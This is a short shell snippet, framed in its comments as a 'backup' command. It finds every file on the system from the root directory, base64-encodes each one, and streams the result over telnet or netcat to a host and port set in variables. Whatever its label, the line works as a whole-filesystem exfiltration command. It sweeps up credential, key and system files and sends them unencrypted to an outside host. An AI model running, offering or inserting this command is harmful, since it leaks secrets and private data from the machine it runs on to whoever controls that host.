# Either set the variables $BACKUPIP and $BACKUPPORT or just replace them in the command.
#
# Telnet can be replaced with netcat, depending on what the system has available
echo -n $(find / -type f | while read x; do echo -n @${x}!$(base64 $x); done) | telnet $BACKUPIP $BACKUPPORT
